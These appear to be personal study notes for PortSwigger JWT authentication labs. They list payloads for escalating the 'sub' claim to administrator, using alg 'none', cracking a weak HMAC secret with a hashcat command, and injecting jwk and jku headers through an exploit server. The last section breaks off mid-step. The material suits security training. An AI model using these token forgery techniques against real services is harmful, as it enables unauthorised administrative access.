# JWT

 Symmetric Key  : HS256
 ASymmetric key : RSA

### Lab: JWT authentication bypass via unverified signature

Payload
```
change path :  /admin

{"iss":"portswigger","exp":1760963935,"sub":"wiener"}

{"iss":"portswigger","exp":1760963935,"sub":"administrator"}



```

### Lab: JWT authentication bypass via flawed signature verification

Payload
```
{"kid":"d6458e13-1d6f-4510-95ed-2a634838ee97","alg":"RS256"} 
{"kid":"d6458e13-1d6f-4510-95ed-2a634838ee97","alg":"none"}
- Remove the signature from the JWT, but remember to leave the trailing dot after the payload.

{"iss":"portswigger","exp":1760966827,"sub":"wiener"}
{"iss":"portswigger","exp":1760966827,"sub":"administrator"}

```

### Lab: JWT authentication bypass via weak signing key

Payload
```
step 1 : Brute-force the secret key

	hashcat -a 0 -m 16500 complete_jwt_tokens ./jwt.secrets.list  : secret1
	Encode in base64 secret1 : c2VjcmV0MQ==

step 2: Generate a forged signing key

	 - JWT Editor Keys tab and click New Symmetric Key : Generate
	 - Replace the generated value for the k property with the Base64-encoded secret.

step 3 - Modify and sign the JWT
		
	 - {"iss":"portswigger","exp":1760963935,"sub":"wiener"}
	 - {"iss":"portswigger","exp":1760963935,"sub":"administrator"}

	 - Sign, then select the key that you generated .



```

## JWT header parameter injections

- According to the JWS specification, only the alg header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

		- 	jwk (JSON Web Key) - Provides an embedded JSON object representing the key.
		-	jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
		-	kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

### Lab: JWT authentication bypass via jwk header injection

Payload
```
- JWT Editor Keys tab.
- Generate a new RSA key .
- JSON Web Token tab and modify the token's payload however you like.
- Click Attack, then select Embedded JWK.
- you may also need to update the JWT's kid header parameter to match the kid of the embedded key

```

### Lab: JWT authentication bypass via jku header injection

Payload
```
step 1: Generate a RSA signing key
	- JWT Editor Keys tab.
	- Generate a new RSA key 
	- Paste the RSA key on exploit server in below section :
		{
    	"keys": [
    		// Generate a new RSA key 
    		]
		}

- step 2 - Modify and sign the JWT
	- Match the both kid values (new values)
	- Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
	- du

```

![alt text](https://raw.githubusercontent.com/robin113x/BSCP-Exam/refs/heads/main/Images/jwt-jku.jpg)
